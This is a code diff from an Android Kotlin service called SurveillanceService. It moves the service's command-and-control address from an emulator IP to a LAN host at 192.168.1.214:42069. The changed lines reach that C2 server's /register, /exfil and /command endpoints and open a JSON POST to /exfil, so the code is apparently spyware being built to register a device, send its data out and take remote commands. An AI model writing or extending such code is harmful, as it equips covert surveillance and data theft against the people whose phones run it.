@@ -181,20 +181,20 @@ class SurveillanceService : Service() {
         showOngoingNotification("Testing C2", "Testing connection to C2 server...")
         
         // Log the server URL we're trying
-        Log.d(TAG, "Attempting to connect to C2 server at: http://10.0.2.2:42069 (emulator special IP)")
+        Log.d(TAG, "Attempting to connect to C2 server at: http://192.168.1.214:42069")
         
         // Try a direct HTTP request first to debug connectivity
         Thread {
             try {
-                // Make a direct connection test to the emulator special address
+                // Make a direct connection test to the C2 server
                 // Test endpoints the C2 server has
-                testDirectConnection("http://10.0.2.2:42069")
+                testDirectConnection("http://192.168.1.214:42069")
                 SystemClock.sleep(1000)  // Wait 1 second between tests
-                testDirectConnection("http://10.0.2.2:42069/register")
+                testDirectConnection("http://192.168.1.214:42069/register")
                 SystemClock.sleep(1000)  // Wait 1 second between tests
-                testDirectConnection("http://10.0.2.2:42069/exfil")
+                testDirectConnection("http://192.168.1.214:42069/exfil")
                 SystemClock.sleep(1000)  // Wait 1 second between tests
-                testDirectConnection("http://10.0.2.2:42069/command")
+                testDirectConnection("http://192.168.1.214:42069/command")
             } catch (e: Exception) {
                 Log.e(TAG, "Direct connection test failed", e)
             }
@@ -203,7 +203,7 @@ class SurveillanceService : Service() {
         // Send a direct POST request to the C2 server
         Thread {
             try {
-                val url = URL("http://10.0.2.2:42069/exfil")
+                val url = URL("http://192.168.1.214:42069/exfil")
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
